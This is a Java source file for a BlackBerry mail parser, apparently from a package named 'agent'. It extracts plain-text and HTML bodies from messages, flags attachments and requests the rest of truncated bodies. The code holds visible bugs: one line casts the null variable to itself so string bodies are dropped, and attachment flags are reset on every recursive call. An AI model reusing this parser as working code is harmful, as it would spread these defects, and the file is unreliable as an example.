package blackberry.agent.mail;

import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.StringPair;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MimeBodyPart;
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.SupportedAttachmentPart;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
import net.rim.blackberry.api.mail.BodyPart.ContentType;

public class MailParser {
    // #debug
    static Debug debug = new Debug("MailParser", DebugLevel.VERBOSE);
  
    private Message message;
    private Mail mail;

    public MailParser(final Message message) {
        this.message = message;
        mail = new Mail();
    }

    public Mail parse() {
        //#ifdef DBC
        Check.requires(message != null, "parse: message != null");
        //#endif
        
        findEmailBody(message.getContent());
        return mail;
    }

    private void findEmailBody(Object obj) {
        //Reset the attachment flags.
        mail.hasSupportedAttachment = false;
        mail.hasUnsupportedAttachment = false;
        if (obj instanceof Multipart) {
            Multipart mp = (Multipart) obj;
            for (int count = 0; count < mp.getCount(); ++count) {
                findEmailBody(mp.getBodyPart(count));
            }
        } else if (obj instanceof TextBodyPart) {
            TextBodyPart tbp = (TextBodyPart) obj;
            readEmailBody(tbp);
        } else if (obj instanceof MimeBodyPart) {
            MimeBodyPart mbp = (MimeBodyPart) obj;
            if (mbp.getContentType().indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
                readEmailBody(mbp);
            }

            else if (mbp.getContentType().equals(
                    ContentType.TYPE_MULTIPART_MIXED_STRING)
                    || mbp.getContentType().equals(
                            ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                //The message has attachments or we are at the top level of the message.
                //Extract all of the parts within the MimeBodyPart message.
                findEmailBody(mbp.getContent());
            }
        } else if (obj instanceof SupportedAttachmentPart) {
            mail.hasSupportedAttachment = true;
        } else if (obj instanceof UnsupportedAttachmentPart) {
            mail.hasUnsupportedAttachment = true;
        }
    }

    /**
     * text/html
     * 
     * @param mbp
     */
    private void readEmailBody(MimeBodyPart mbp) {
        //Extract the content of the message.
        Object obj = mbp.getContent();
        String mimeType = mbp.getContentType();
        String body = null;
        if (obj instanceof String) {
            body = (String) body;
        } else if (obj instanceof byte[]) {
            body = new String((byte[]) obj);
        }
        if (mimeType.indexOf(ContentType.TYPE_TEXT_PLAIN_STRING) != -1) {
            mail.plainTextMessage = body;
            //Determine if all of the text body part is present.
            if (mbp.hasMore() && !mbp.moreRequestSent()) {
                try {
                    Transport.more((BodyPart) mbp, true);
                } catch (Exception ex) {
                    //#debug error
                    debug.error("readEmailBody Mime Text: " + ex);
                }
            }
        } else if (mimeType.indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
            mail.htmlMessage = body;
            //Determine if all of the HTML body part is present.
            if (mbp.hasMore() && !mbp.moreRequestSent()) {
                try {
                    Transport.more((BodyPart) mbp, true);
                } catch (Exception ex) {
                    //#debug error
                    debug.error("readEmailBody Mime Html: " + ex);
                }
            }
        }
    }

    /**
     * text/plain
     * 
     * @param tbp
     */
    private void readEmailBody(TextBodyPart tbp) {
        mail.plainTextMessage = (String) tbp.getContent();
        if (tbp.hasMore() && !tbp.moreRequestSent()) {
            try {
                Transport.more((BodyPart) tbp, true);
            } catch (Exception ex) {
                //#debug error
                debug.error("readEmailBody Text: " + ex);
            }
        }
    }
}
